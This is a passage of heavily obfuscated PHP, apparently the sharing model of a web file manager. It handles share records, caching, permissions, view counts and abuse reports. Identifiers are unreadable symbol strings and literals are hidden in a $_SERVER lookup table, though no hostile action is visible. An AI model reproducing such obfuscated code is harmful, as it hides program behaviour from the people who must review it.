array($Ϋ«Κ©ύ–, $‘«Φ®ξΆ[2139], $Ι‰εΖ†Ύ)); } protected function listSimple() { $³«Θ¤π¤ = array($_SERVER[γγάψ½][1793] => USER_ID); $ΐ–ιΧ¨φ = $this->field($this->fieldList)->where($³«Θ¤π¤)->select(); return $ΐ–ιΧ¨φ ? $ΐ–ιΧ¨φ : array(); } protected function getInfo($’…οΈΜ£, $ςΈέ¥γ = false, $…ΨΟ‡γξ = '') { $µ»±γΌ‰ =& $_SERVER[γγάψ½]; if (!$…ΨΟ‡γξ) { $…ΨΟ‡γξ = $µ»±γΌ‰[2136] . USER_ID; } if ($ςΈέ¥γ) { return $this->_getShareInfo(array($µ»±γΌ‰[673] => $’…οΈΜ£)); } $μ½­€™­ = $this->cacheFunctionGet($µ»±γΌ‰[2079], $’…οΈΜ£, $…ΨΟ‡γξ); $‡ΦΜΫϊ¨ = $this->shareInfoMofify($μ½­€™­, $µ»±γΌ‰[226]); if (isset($μ½­€™­[$µ»±γΌ‰[88]]) && $‡ΦΜΫϊ¨ != $μ½­€™­[$µ»±γΌ‰[88]]) { $ΤΠχΙ„ = $this->cacheKeyMake($µ»±γΌ‰[2079], $’…οΈΜ£, $…ΨΟ‡γξ); $μ½­€™­ = $this->_getShareInfo(array($µ»±γΌ‰[673] => $’…οΈΜ£)); Cache::set($ΤΠχΙ„, $μ½­€™­); } return $μ½­€™­; } private function shareInfoMofify(&$ θμυαΘ, $‰λµ„Ξ = "\x67\145\164") { $‡”§”Υ =& $_SERVER[γγάψ½]; if (!$ θμυαΘ || !isset($ θμυαΘ[$‡”§”Υ[673]])) { return; } $β„†Π§Ρ = $‡”§”Υ[2140] . $ θμυαΘ[$‡”§”Υ[673]]; if ($‰λµ„Ξ == $‡”§”Υ[226]) { return Cache::get($β„†Π§Ρ); } else { if ($‰λµ„Ξ == $‡”§”Υ[2108]) { $ίχ§Κΐ = Cache::get($β„†Π§Ρ); if ($ίχ§Κΐ === $ θμυαΘ[$‡”§”Υ[88]]) { return; } $ θμυαΘ[$‡”§”Υ[2141]] = USER_ID . $‡”§”Υ[465] . $ θμυαΘ[$‡”§”Υ[88]]; Cache::set($β„†Π§Ρ, $ θμυαΘ[$‡”§”Υ[88]]); } else { if ($‰λµ„Ξ == $‡”§”Υ[2142]) { Cache::remove($β„†Π§Ρ); } } } } public function getInfoByHash($¦«ΔΛ) { return $this->_getShareInfo(array($_SERVER[γγάψ½][2143] => $¦«ΔΛ)); } public function getInfoByPath($΄•―ϊΞ) { $›©μό‘ =& $_SERVER[γγάψ½]; $§Ι…ά  = array($›©μό‘[1793] => USER_ID, $›©μό‘[194] => $΄•―ϊΞ); return $this->_getShareInfo($§Ι…ά ); } public function getInfoBySourcePath($λ΄ΖΧε„) { $λΉµκ—Α =& $_SERVER[γγάψ½]; $ιλΓ¨• = array($λΉµκ—Α[1793] => USER_ID, $λΉµκ—Α[1268] => $λ΄ΖΧε„); return $this->_getShareInfo($ιλΓ¨•); } private function _getShareInfo($«όΏΣω) { $†Ϋ…»­ =& $_SERVER[γγάψ½]; $όΔφϊ™ = $this->where($«όΏΣω)->find(); if (!$όΔφϊ™) { return !1; } $«όΏΣω = array($†Ϋ…»­[673] => $όΔφϊ™[$†Ϋ…»­[673]]); $μ™―ΆΑ = $†Ϋ…»­[2144]; $°Β•“„ = Model($†Ϋ…»­[674])->order($†Ϋ…»­[478])->field($μ™―ΆΑ)->where($«όΏΣω)->select(); if ($όΔφϊ™[$†Ϋ…»­[194]] == $†Ϋ…»­[231]) { $όΔφϊ™[$†Ϋ…»­[90]] = IO::info($όΔφϊ™[$†Ϋ…»­[1268]]); } else { $όΔφϊ™[$†Ϋ…»­[90]] = Model($†Ϋ…»­[1439])->pathInfo($όΔφϊ™[$†Ϋ…»­[194]]); } $όΔφϊ™[$†Ϋ…»­[2145]] = $°Β•“„; $this->shareInfoMofify($όΔφϊ™, $†Ϋ…»­[2108]); return $όΔφϊ™; } protected function getInfoAuth($νκθ„ο) { $Π¨ΧψΧ‡ =& $_SERVER[γγάψ½]; $©άι Ύ = $this->getInfo($νκθ„ο); if ($©άι Ύ[$Π¨ΧψΧ‡[1793]] == USER_ID) { $©άι Ύ[$Π¨ΧψΧ‡[490]] = $©άι Ύ[$Π¨ΧψΧ‡[90]][$Π¨ΧψΧ‡[490]]; } else { $©άι Ύ[$Π¨ΧψΧ‡[490]] = Model($Π¨ΧψΧ‡[572])->authMake($©άι Ύ[$Π¨ΧψΧ‡[2145]]); } return $©άι Ύ; } protected function listData($»«ΩΦςγ = null, $ΜΞϊά = 300) { $ ς΅µΔ =& $_SERVER[γγάψ½]; $ϊΒΈμ™– = array(array($ ς΅µΔ[567] => array($ ς΅µΔ[1098], 0), $ ς΅µΔ[671] => array($ ς΅µΔ[1098], 0), $ ς΅µΔ[2146] => $ ς΅µΔ[2096])); if ($»«ΩΦςγ == $ ς΅µΔ[2147]) { $ϊΒΈμ™– = array($ ς΅µΔ[567] => 1); } else { if ($»«ΩΦςγ == $ ς΅µΔ[1251]) { $ϊΒΈμ™– = array($ ς΅µΔ[671] => 1); } } $ϊΒΈμ™–[$ ς΅µΔ[1793]] = USER_ID; $ά»µ¤ωΪ = $this->where($ϊΒΈμ™–)->selectPage($ΜΞϊά); return $ά»µ¤ωΪ; } protected function listToMe($Ι§Λϊƒ = 300) { $›τΫΞ«Ά =& $_SERVER[γγάψ½]; $ΐϋ³λΊ = Model($›τΫΞ«Ά[2148])->userGroupParents(USER_ID); $·…τρζ = array($›τΫΞ«Ά[656] => SourceModel::TYPE_USER, $›τΫΞ«Ά[574] => USER_ID); if ($ΐϋ³λΊ) { $·…τρζ = array(array($›τΫΞ«Ά[656] => SourceModel::TYPE_USER, $›τΫΞ«Ά[574] => USER_ID), array($›τΫΞ«Ά[656] => SourceModel::TYPE_GROUP, $›τΫΞ«Ά[574] => array($›τΫΞ«Ά[7], $ΐϋ³λΊ)), $›τΫΞ«Ά[2146] => $›τΫΞ«Ά[2096]); } $ΔΈΖθΝ³ = Model($›τΫΞ«Ά[674])->where($·…τρζ)->selectPage($Ι§Λϊƒ); $‹ΰΉΕϋ΄ = array_to_keyvalue_group($ΔΈΖθΝ³[$›τΫΞ«Ά[448]], $›τΫΞ«Ά[673]); if (!$‹ΰΉΕϋ΄) { return $ΔΈΖθΝ³; } $σχΌ›© = $›τΫΞ«Ά[2149]; $·…τρζ = array($›τΫΞ«Ά[673] => array($›τΫΞ«Ά[495], array_keys($‹ΰΉΕϋ΄)), $›τΫΞ«Ά[1793] => array($›τΫΞ«Ά[1100], $›τΫΞ«Ά[231])); $›¦ζ©“Ο = $this->field($σχΌ›©)->where($·…τρζ)->select(); foreach ($›¦ζ©“Ο as $¶ύ€Θξ => &$¤μι©εα) { $¤μι©εα[$›τΫΞ«Ά[2145]] = $‹ΰΉΕϋ΄[$¤μι©εα[$›τΫΞ«Ά[673]]]; } unset($¤μι©εα); $Τ‚λ®±φ = array($›τΫΞ«Ά[2150] => $›¦ζ©“Ο, $›τΫΞ«Ά[2151] => $ΔΈΖθΝ³[$›τΫΞ«Ά[445]]); return $Τ‚λ®±φ; } protected function shareAdd($°¦ω«³ο, $©ύΏυΗ) { $¬·ω’‘ =& $_SERVER[γγάψ½]; $σ Θφ = $this->_addShareData($°¦ω«³ο, $©ύΏυΗ); if (!empty($©ύΏυΗ[$¬·ω’‘[2152]])) { $this->_shareAuthSet($σ Θφ, $©ύΏυΗ[$¬·ω’‘[2152]]); } $this->shareEventAdd($°¦ω«³ο, $©ύΏυΗ, $¬·ω’‘[2153]); return $σ Θφ; } protected function shareAddSystem($°”αΕ†„, $—­ΛΚΗ) { $‡¥Φ’ΐ΄ =& $_SERVER[γγάψ½]; $Πσ†π = $this->_addShareData($°”αΕ†„, $—­ΛΚΗ, $‡¥Φ’ΐ΄[192]); $this->_shareAuthSet($Πσ†π, $—­ΛΚΗ[$‡¥Φ’ΐ΄[2152]]); return $Πσ†π; } private function shareEventAdd($‹ιλΰθ–, $εΤΤΎ, $΅­¨ϊΧζ = "\141\x64\144") { $ςισωΖ¤ =& $_SERVER[γγάψ½]; if (!$‹ιλΰθ– || $‹ιλΰθ– == $ςισωΖ¤[231]) { return; } if ($΅­¨ϊΧζ == $ςισωΖ¤[2153]) { if ($εΤΤΎ[$ςισωΖ¤[567]] == $ςισωΖ¤[91]) { Model($ςισωΖ¤[641])->eventShare($‹ιλΰθ–, $ςισωΖ¤[2154]); } if ($εΤΤΎ[$ςισωΖ¤[671]] == $ςισωΖ¤[91]) { Model($ςισωΖ¤[641])->eventShare($‹ιλΰθ–, $ςισωΖ¤[2155]); } return; } $³ΉΈΒ®Ω = $this->getInfoByPath($‹ιλΰθ–); $ωΑΥχ΄€ = $ςισωΖ¤[2156]; if ($³ΉΈΒ®Ω[$ςισωΖ¤[567]] == $ςισωΖ¤[231] && $εΤΤΎ[$ςισωΖ¤[567]] == $ςισωΖ¤[91]) { $ωΑΥχ΄€ = $ςισωΖ¤[2154]; } if ($³ΉΈΒ®Ω[$ςισωΖ¤[567]] == $ςισωΖ¤[91] && $εΤΤΎ[$ςισωΖ¤[567]] == $ςισωΖ¤[231]) { $ωΑΥχ΄€ = $ςισωΖ¤[2157]; } if ($³ΉΈΒ®Ω[$ςισωΖ¤[671]] == $ςισωΖ¤[231] && $εΤΤΎ[$ςισωΖ¤[671]] == $ςισωΖ¤[91]) { $ωΑΥχ΄€ = $ςισωΖ¤[2155]; } if ($³ΉΈΒ®Ω[$ςισωΖ¤[671]] == $ςισωΖ¤[91] && $εΤΤΎ[$ςισωΖ¤[671]] == $ςισωΖ¤[231]) { $ωΑΥχ΄€ = $ςισωΖ¤[2158]; } Model($ςισωΖ¤[641])->eventShare($‹ιλΰθ–, $ωΑΥχ΄€); return; } private function _addShareData($±‚Κƒ, $§σ¶κ = array(), $ϊ®«Ω•³ = false) { $“ν“³ε” =& $_SERVER[γγάψ½]; $Β°έϋ“ = $ϊ®«Ω•³ == $“ν“³ε”[192] ? 0 : USER_ID; $Η‘«θη = array($“ν“³ε”[494] => $±‚Κƒ, $“ν“³ε”[1784] => $Β°έϋ“); if ($±‚Κƒ == 0) { $Η‘«θη = array($“ν“³ε”[2159] => $§σ¶κ[$“ν“³ε”[1268]], $“ν“³ε”[1784] => $Β°έϋ“); } if ($Ξ®λ„Ψ = $this->where($Η‘«θη)->find()) { return $Ξ®λ„Ψ[$“ν“³ε”[673]]; } if ($±‚Κƒ == 0) { $λ°ήΖέ¦ = array($“ν“³ε”[32] => get_path_this($§σ¶κ[$“ν“³ε”[87]])); } else { $λ°ήΖέ¦ = Model($“ν“³ε”[905])->sourceInfo($±‚Κƒ); if (!$λ°ήΖέ¦) { return !1; } } if (!$§σ¶κ[$“ν“³ε”[1679]]) { $§σ¶κ[$“ν“³ε”[1679]] = $λ°ήΖέ¦[$“ν“³ε”[32]]; } $δ³Τ½€” = array($“ν“³ε”[1784] => $Β°έϋ“, $“ν“³ε”[494] => $±‚Κƒ, $“ν“³ε”[1679] => $“ν“³ε”[12], $“ν“³ε”[567] => 0, $“ν“³ε”[671] => 0, $“ν“³ε”[1268] => $“ν“³ε”[12], $“ν“³ε”[385] => $“ν“³ε”[12], $“ν“³ε”[975] => $“ν“³ε”[12], $“ν“³ε”[2160] => 0, $“ν“³ε”[2161] => 0, $“ν“³ε”[836] => 0, $“ν“³ε”[2162] => $“ν“³ε”[12], $“ν“³ε”[2143] => $“ν“³ε”[12]); $‚ΫπΈΈ = explode($“ν“³ε”[50], $“ν“³ε”[2163]); foreach ($‚ΫπΈΈ as $«ώξ―Ϋχ) { if (!isset($§σ¶κ[$«ώξ―Ϋχ])) { continue; } $δ³Τ½€”[$«ώξ―Ϋχ] = $§σ¶κ[$«ώξ―Ϋχ]; } $‰³®συ² = $this->add($δ³Τ½€”); $ΖχσσΥΣ = array($“ν“³ε”[2143] => short_id($‰³®συ²)); $this->where(array($“ν“³ε”[2164] => $‰³®συ²))->save($ΖχσσΥΣ); return $‰³®συ²; } private function _shareAuthSet($Ιϊυ‡Ό, $ΈΡ­ΰ„Ά) { $ά¬Τ =& $_SERVER[γγάψ½]; if (!is_array($ΈΡ­ΰ„Ά)) { return !1; } $²Σ—α§Ν = Model($ά¬Τ[2106]); $²Σ—α§Ν->where(array($ά¬Τ[673] => $Ιϊυ‡Ό))->delete(); $³΅ύσΗ² = array(); foreach ($ΈΡ­ΰ„Ά as $¥ητ§³η) { $σ΄λ“  = SourceModel::TYPE_USER; if ($¥ητ§³η[$ά¬Τ[191]] == SourceModel::TYPE_GROUP) { $σ΄λ“  = SourceModel::TYPE_GROUP; } $ΊπΦΕ²λ = array($ά¬Τ[673] => $Ιϊυ‡Ό, $ά¬Τ[191] => $σ΄λ“ , $ά¬Τ[574] => intval($¥ητ§³η[$ά¬Τ[574]]), $ά¬Τ[2102] => 0, $ά¬Τ[2165] => -1); if ($¥ητ§³η[$ά¬Τ[2102]]) { $ΊπΦΕ²λ[$ά¬Τ[2102]] = $¥ητ§³η[$ά¬Τ[2102]]; } else { if ($¥ητ§³η[$ά¬Τ[2165]]) { $ΊπΦΕ²λ[$ά¬Τ[2165]] = $¥ητ§³η[$ά¬Τ[2165]]; } } $³΅ύσΗ²[] = $ΊπΦΕ²λ; } return $²Σ—α§Ν->addAll($³΅ύσΗ², array(), !0); } public function numViewAdd($»ΠΦΡβ°) { $κμΧ‘ =& $_SERVER[γγάψ½]; $“ίοηΕΠ = array($κμΧ‘[2164] => $»ΠΦΡβ°); $this->where($“ίοηΕΠ)->setAdd($κμΧ‘[2160]); } public function numDownloadAdd($ύΐΫΠ‡) { $ΝΌλςΫΏ =& $_SERVER[γγάψ½]; $°νΦ·δ = array($ΝΌλςΫΏ[2164] => $ύΐΫΠ‡); $this->where($°νΦ·δ)->setAdd($ΝΌλςΫΏ[2161]); } protected function shareEdit($Ηµ–ΓΥΖ, $Ϊ“εΥΤ) { $Ζ‡­­ =& $_SERVER[γγάψ½]; $ΣΖΌ¨¤ = $this->getInfo($Ηµ–ΓΥΖ); if (!$ΣΖΌ¨¤) { return !1; } $this->_checkLinkShare($Ϊ“εΥΤ, $ΣΖΌ¨¤); $™„ά‘Θ = array(); $χνΝπΘΥ = explode($Ζ‡­­[50], $Ζ‡­­[2166]); foreach ($χνΝπΘΥ as $ΠΟ€ƒθδ) { if (!array_key_exists($ΠΟ€ƒθδ, $Ϊ“εΥΤ)) { continue; } $™„ά‘Θ[$ΠΟ€ƒθδ] = $Ϊ“εΥΤ[$ΠΟ€ƒθδ]; } $this->shareEventAdd($ΣΖΌ¨¤[$Ζ‡­­[194]], $Ϊ“εΥΤ, $Ζ‡­­[1963]); $this->where(array($Ζ‡­­[2164] => $Ηµ–ΓΥΖ))->save($™„ά‘Θ); if (isset($Ϊ“εΥΤ[$Ζ‡­­[2152]])) { $this->_shareAuthSet($Ηµ–ΓΥΖ, $Ϊ“εΥΤ[$Ζ‡­­[2152]]); } return !0; } private function _checkLinkShare($άϊ§¶, $ΙΠΝφ©β) { $Π΅΅Ξπ =& $_SERVER[γγάψ½]; if ($άϊ§¶[$Π΅΅Ξπ[567]] != $Π΅΅Ξπ[91]) { return; } $μ‹δΰφ© = $ΙΠΝφ©β[$Π΅΅Ξπ[90]][$Π΅΅Ξπ[194]]; if ($ΙΠΝφ©β[$Π΅΅Ξπ[90]][$Π΅΅Ξπ[33]] != $Π΅΅Ξπ[233]) { $Ψίµ­‚Β = $this->_folderReport($μ‹δΰφ©); if (!$Ψίµ­‚Β) { return; } show_json(LNG($Π΅΅Ξπ[2167]) . $Π΅΅Ξπ[2168] . $Ψίµ­‚Β, !1); } $‚ ®βρΝ = Model($Π΅΅Ξπ[905])->fileInfoGet($ΙΠΝφ©β[$Π΅΅Ξπ[90]][$Π΅΅Ξπ[194]]); if (!$‚ ®βρΝ) { return; } $θΝΨ—Ϊ = $this->shareFileMeta($‚ ®βρΝ[$Π΅΅Ξπ[546]]); if (isset($θΝΨ—Ϊ[$Π΅΅Ξπ[453]]) && $θΝΨ—Ϊ[$Π΅΅Ξπ[453]] == $Π΅΅Ξπ[91]) { show_json(LNG($Π΅΅Ξπ[2169]), !1); } } private function _folderReport($ξΙ€ώΆχ) { $ζΦµΪ”‹ =& $_SERVER[γγάψ½]; $ΈΖγΑγ© = array($ζΦµΪ”‹[546] => array($ζΦµΪ”‹[1098], 0), $ζΦµΪ”‹[825] => 3); $πΓΥμζρ = Model($ζΦµΪ”‹[2170])->where($ΈΖγΑγ©)->field($ζΦµΪ”‹[546])->select(); if (!$πΓΥμζρ) { return !1; } $πΓΥμζρ = array_to_keyvalue($πΓΥμζρ, $ζΦµΪ”‹[12], $ζΦµΪ”‹[546]); $ϋϋ“† = $ζΦµΪ”‹[50] . $ξΙ€ώΆχ . $ζΦµΪ”‹[50]; $ΈΖγΑγ© = array($ζΦµΪ”‹[546] => array($ζΦµΪ”‹[7], $πΓΥμζρ), $ζΦµΪ”‹[589] => array($ζΦµΪ”‹[462], "\x25{$ϋϋ“†}\x25"), $ζΦµΪ”‹[508] => 0); $ΰΛ¥Έΰ = Model($ζΦµΪ”‹[905])->where($ΈΖγΑγ©)->field($ζΦµΪ”‹[2171])->find(); if (!$ΰΛ¥Έΰ) { return !1; } $όΤ§ε¶… = substr($ΰΛ¥Έΰ[$ζΦµΪ”‹[589]], strpos($ΰΛ¥Έΰ[$ζΦµΪ”‹[589]], $ϋϋ“†)); $ΈΖγΑγ© = array($ζΦµΪ”‹[194] => array($ζΦµΪ”‹[7], trim($όΤ§ε¶…, $ζΦµΪ”‹[50]))); $΅ΟΡλα = Model($ζΦµΪ”‹[905])->where($ΈΖγΑγ©)->field($ζΦµΪ”‹[32])->select(); $³Α®¶ = array_to_keyvalue($΅ΟΡλα, $ζΦµΪ”‹[12], $ζΦµΪ”‹[32]); $³Α®¶[] = $ΰΛ¥Έΰ[$ζΦµΪ”‹[32]]; return implode($ζΦµΪ”‹[8], $³Α®¶); } protected function remove($ΩύΤ¨†) { $¤¥…° =& $_SERVER[γγάψ½]; $χφ—™‘ή = is_array($ΩύΤ¨†) ? $ΩύΤ¨† : array($ΩύΤ¨†); for ($¬ωτΤ = 0; $¬ωτΤ < count($χφ—™‘ή); $¬ωτΤ++) { $λ±¤ΝΫχ = $this->getInfo($χφ—™‘ή[$¬ωτΤ]); if ($λ±¤ΝΫχ[$¤¥…°[671]] == $¤¥…°[91]) { Model($¤¥…°[641])->eventShare($λ±¤ΝΫχ[$¤¥…°[194]], $¤¥…°[2158]); } if ($λ±¤ΝΫχ[$¤¥…°[567]] == $¤¥…°[91]) { Model($¤¥…°[641])->eventShare($λ±¤ΝΫχ[$¤¥…°[194]], $¤¥…°[2157]); } $this->shareInfoMofify($λ±¤ΝΫχ, $¤¥…°[2142]); } $„‰ΟΑΝ¨ = array($¤¥…°[673] => array($¤¥…°[7], $χφ—™‘ή)); $ΥΧϋυ— = $this->where($„‰ΟΑΝ¨)->delete(); if ($ΥΧϋυ—) { Model($¤¥…°[674])->where($„‰ΟΑΝ¨)->delete(); } return $ΥΧϋυ—; } protected function removeBySource($¨°Ζ¨™) { $†ϋΫΧ£ =& $_SERVER[γγάψ½]; $”΅”Β = array($†ϋΫΧ£[494] => array($†ϋΫΧ£[495], $¨°Ζ¨™)); $μΊΜ©δ = $this->field($†ϋΫΧ£[673])->where($”΅”Β)->select(); $Ίγ‰Ά…½ = array_to_keyvalue($μΊΜ©δ, $†ϋΫΧ£[12], $†ϋΫΧ£[673]); if (!$Ίγ‰Ά…½) { return; } foreach ($μΊΜ©δ as $§Χ―‘Γλ) { $this->shareInfoMofify($§Χ―‘Γλ, $†ϋΫΧ£[2142]); } $”΅”Β = array($†ϋΫΧ£[2164] => array($†ϋΫΧ£[495], $Ίγ‰Ά…½)); $this->where($”΅”Β)->delete(); Model($†ϋΫΧ£[674])->where($”΅”Β)->delete(); } public function listAll($θΫ”ΉΣΒ) { $¬‹ΧΏχ« =& $_SERVER[γγάψ½]; $υ‚” = array(); if ($θΫ”ΉΣΒ[$¬‹ΧΏχ«[1793]]) { $υ‚”[$¬‹ΧΏχ«[1793]] = $θΫ”ΉΣΒ[$¬‹ΧΏχ«[1793]]; } if ($θΫ”ΉΣΒ[$¬‹ΧΏχ«[835]]) { $Ϊυµ£χΩ = $θΫ”ΉΣΒ[$¬‹ΧΏχ«[836]] ? $θΫ”ΉΣΒ[$¬‹ΧΏχ«[836]] : strtotime(date($¬‹ΧΏχ«[2172])); $υ‚”[$¬‹ΧΏχ«[234]] = array($¬‹ΧΏχ«[411], array($θΫ”ΉΣΒ[$¬‹ΧΏχ«[835]], $Ϊυµ£χΩ)); } if ($θΫ”ΉΣΒ[$¬‹ΧΏχ«[33]]) { $υ‚”[$θΫ”ΉΣΒ[$¬‹ΧΏχ«[33]]] = 1; } else { $υ‚”[] = array($¬‹ΧΏχ«[567] => array($¬‹ΧΏχ«[1098], 0), $¬‹ΧΏχ«[671] => array($¬‹ΧΏχ«[1098], 0), $¬‹ΧΏχ«[2146] => $¬‹ΧΏχ«[2096]); } if ($θΫ”ΉΣΒ[$¬‹ΧΏχ«[2092]]) { $υ‚”[] = array($¬‹ΧΏχ«[2143] => $θΫ”ΉΣΒ[$¬‹ΧΏχ«[2092]], $¬‹ΧΏχ«[1679] => array($¬‹ΧΏχ«[462], "\x25{$θΫ”ΉΣΒ[$¬‹ΧΏχ«[2092]]}\x25"), $¬‹ΧΏχ«[2146] => $¬‹ΧΏχ«[2096]); } $τ¶­ΐ = $this->_makeOrder()->where($υ‚”)->selectPage(20); if (empty($τ¶­ΐ[$¬‹ΧΏχ«[448]])) { return array(); } $this->_listDataApply($τ¶­ΐ[$¬‹ΧΏχ«[448]]); return $τ¶­ΐ; } public function listDataApply($Ύλψµ) { $this->_listDataApply($Ύλψµ); return $Ύλψµ; } private function _listDataApply(&$…†Μ©©·) { $ΤΑυΩ =& $_SERVER[γγάψ½]; $‘ρΐ£ = array_to_keyvalue($…†Μ©©·, $ΤΑυΩ[12], $ΤΑυΩ[1793]); $σ±ή’ = Model($ΤΑυΩ[602])->userListInfo(array_unique($‘ρΐ£)); $ύώ¤”δ• = array_to_keyvalue($…†Μ©©·, $ΤΑυΩ[12], $ΤΑυΩ[194]); $›π­Ωνµ = Model($ΤΑυΩ[905])->sourceListInfo($ύώ¤”δ•, !0); foreach ($…†Μ©©· as $¨“¶Δθ => &$Χ¦ΤΪ®) { $γ­δΐ = $Χ¦ΤΪ®[$ΤΑυΩ[1793]]; $Χ¦ΤΪ®[$ΤΑυΩ[2173]] = $σ±ή’[$γ­δΐ] ? $σ±ή’[$γ­δΐ] : !1; if (!$Χ¦ΤΪ®[$ΤΑυΩ[2173]] || $Χ¦ΤΪ®[$ΤΑυΩ[2173]][$ΤΑυΩ[825]] != $ΤΑυΩ[91]) { unset($…†Μ©©·[$¨“¶Δθ]); continue; } $¬Δ° = $Χ¦ΤΪ®[$ΤΑυΩ[194]]; $Χ¦ΤΪ®[$ΤΑυΩ[90]] = $›π­Ωνµ[$¬Δ°] ? $›π­Ωνµ[$¬Δ°] : !1; if ($Χ¦ΤΪ®[$ΤΑυΩ[90]][$ΤΑυΩ[508]] == $ΤΑυΩ[91]) { unset($…†Μ©©·[$¨“¶Δθ]); } if ($Χ¦ΤΪ®[$ΤΑυΩ[90]] != $ΤΑυΩ[231] && !$Χ¦ΤΪ®[$ΤΑυΩ[90]]) { unset($…†Μ©©·[$¨“¶Δθ]); } } unset($Χ¦ΤΪ®); $…†Μ©©· = array_values($…†Μ©©·); } private function _makeOrder($µΦμ³ή’ = '') { $•βς΄³ =& $_SERVER[γγάψ½]; $³οΕα±ζ = array($•βς΄³[234], $•βς΄³[836], $•βς΄³[2160], $•βς΄³[2161]); $υ–Εμΐ = array($•βς΄³[526] => $•βς΄³[527], $•βς΄³[528] => $•βς΄³[529]); $ύΈ½ϋ΅ = Input::get($•βς΄³[533], $•βς΄³[7], $•βς΄³[500], $³οΕα±ζ); $„‚—ϋΠ­ = Input::get($•βς΄³[534], $•βς΄³[7], $•βς΄³[2174], array($•βς΄³[2089], $•βς΄³[528])); $„‚—ϋΠ­ = $υ–Εμΐ[$„‚—ϋΠ­]; $µΦμ³ή’ = $µΦμ³ή’ . "{$ύΈ½ϋ΅}\40{$„‚—ϋΠ­}"; return $this->order($µΦμ³ή’); } public function reportAdd($ρ”Νό) { $ΫΕϋόώ =& $_SERVER[γγάψ½]; $«·Ψ»Ε = array($ΫΕϋόώ[673] => $ρ”Νό[$ΫΕϋόώ[673]], $ΫΕϋόώ[1793] => USER_ID); if (Model($ΫΕϋόώ[2170])->where($«·Ψ»Ε)->find()) { return !1; } $“ΠΛ„• = array($ΫΕϋόώ[673] => $ρ”Νό[$ΫΕϋόώ[673]], $ΫΕϋόώ[1679] => $ρ”Νό[$ΫΕϋόώ[1679]], $ΫΕϋόώ[194] => $ρ”Νό[$ΫΕϋόώ[194]], $ΫΕϋόώ[546] => $ρ”Νό[$ΫΕϋόώ[546]], $ΫΕϋόώ[1793] => USER_ID, $ΫΕϋόώ[33] => $ρ”Νό[$ΫΕϋόώ[33]], $ΫΕϋόώ[529] => $ρ”Νό[$ΫΕϋόώ[529]]); return Model($ΫΕϋόώ[2170])->add($“ΠΛ„•); } public function reportList($Όά·θδΐ) { $σ“‡§ε =& $_SERVER[γγάψ½]; $‰ςέ™Ψ = array(); if ($Όά·θδΐ[$σ“‡§ε[835]]) { $–ΓΤ• = $Όά·θδΐ[$σ“‡§ε[836]] ? $Όά·θδΐ[$σ“‡§ε[836]] : strtotime(date($σ“‡§ε[2172])); $‰ςέ™Ψ[$σ“‡§ε[234]] = array($σ“‡§ε[411], array($Όά·θδΐ[$σ“‡§ε[835]], $–ΓΤ•)); } if (isset($Όά·θδΐ[$σ“‡§ε[33]]) && in_array($Όά·θδΐ[$σ“‡§ε[33]], array($σ“‡§ε[91], $σ“‡§ε[513], $σ“‡§ε[2175], $σ“‡§ε[2176], $σ“‡§ε[2177]))) { $‰ςέ™Ψ[$σ“‡§ε[33]] = $Όά·θδΐ[$σ“‡§ε[33]]; } if (isset($Όά·θδΐ[$σ“‡§ε[825]]) && in_array($Όά·θδΐ[$σ“‡§ε[825]], array($σ“‡§ε[231], $σ“‡§ε[91], $σ“‡§ε[513], $σ“‡§ε[2175]))) { $‰ςέ™Ψ[$σ“‡§ε[825]] = $Όά·θδΐ[$σ“‡§ε[825]]; } $ΩΧ°ωΗ = Input::get($σ“‡§ε[534], $σ“‡§ε[7], $σ“‡§ε[2174], array($σ“‡§ε[2089], $σ“‡§ε[528])); $ώ‘–Όα² = array($σ“‡§ε[526] => $σ“‡§ε[527], $σ“‡§ε[528] => $σ“‡§ε[529]); $…έέ”α£ = $σ“‡§ε[2178] . $ώ‘–Όα²[$ΩΧ°ωΗ]; $Ο‚Ϊό = Model($σ“‡§ε[2170])->where($‰ςέ™Ψ)->order($…έέ”α£)->selectPage(20); if (empty($Ο‚Ϊό[$σ“‡§ε[448]])) { return array(); } $ξΐίΕά = array_to_keyvalue_group($Ο‚Ϊό[$σ“‡§ε[448]], $σ“‡§ε[825], $σ“‡§ε[673]); if (!empty($ξΐίΕά[0])) { $Όά·θδΐ = $ξΐίΕά[0]; $‰ςέ™Ψ = array($σ“‡§ε[673] => array($σ“‡§ε[7], $Όά·θδΐ)); $λΦΥΖ² = $this->where($‰ςέ™Ψ)->field($σ“‡§ε[673])->select(); $λΦΥΖ² = array_to_keyvalue($λΦΥΖ², $σ“‡§ε[12], $σ“‡§ε[673]); $ΤυΒοΐ– = array_diff($Όά·θδΐ, $λΦΥΖ²); if (!empty($ΤυΒοΐ–)) { foreach ($Ο‚Ϊό[$σ“‡§ε[448]] as $£ηΖ³ => $τΉηε) { if (in_array($τΉηε[$σ“‡§ε[673]], $ΤυΒοΐ–)) { unset($Ο‚Ϊό[$σ“‡§ε[448]][$£ηΖ³]); } } } } $this->_listDataApply($Ο‚Ϊό[$σ“‡§ε[448]]); return $Ο‚Ϊό; } public function reportStatus($ς­Ύ¬) { $­™–φ• =& $_SERVER[γγάψ½]; $Ο±¤ΙΎ± = array($­™–φ•[478] => $ς­Ύ¬[$­™–φ•[478]]); $ύΙΌφΊµ = Model($­™–φ•[2170])->where($Ο±¤ΙΎ±)->field($­™–φ•[2179])->find(); if (!$ύΙΌφΊµ) { return !1; } $υθΙβ² = array($­™–φ•[825] => $ς­Ύ¬[$­™–φ•[825]]); if ($ς­Ύ¬[$­™–φ•[825]] == $­™–φ•[2175] && $ύΙΌφΊµ[$­™–φ•[825]] == $­™–φ•[2175]) { $υθΙβ²[$­™–φ•[825]] = 0; } $φιήθ¶ = Model($­™–φ•[2170])->where($Ο±¤ΙΎ±)->save($υθΙβ²); if ($ς­Ύ¬[$­™–φ•[825]] == $­™–φ•[513]) { if ($ύΙΌφΊµ[$­™–φ•[546]] != $­™–φ•[231] && $this->shareFileMeta($ύΙΌφΊµ[$­™–φ•[546]])) { $this->shareFileMeta($ύΙΌφΊµ[$­™–φ•[546]], 0); } $this->remove($ύΙΌφΊµ[$­™–φ•[673]]); return !0; } if ($φιήθ¶ && $ς­Ύ¬[$­™–φ•[825]] == $­™–φ•[2175]) { $ύζ―ργ” = $υθΙβ²[$­™–φ•[825]] == $­™–φ•[2175] ? 1 : 0; $this->shareFileMeta($ύΙΌφΊµ[$­™–φ•[546]], $ύζ―ργ”); $this->removeByFile($ύΙΌφΊµ[$­™–φ•[546]]); } return $φιήθ¶; } private function removeByFile($§ε‡Υώ) { $Ί„Θ§£χ =& $_SERVER[γγάψ½]; $ΖΛ±βάΆ = Model($Ί„Θ§£χ[905])->where(array($Ί„Θ§£χ[546] => 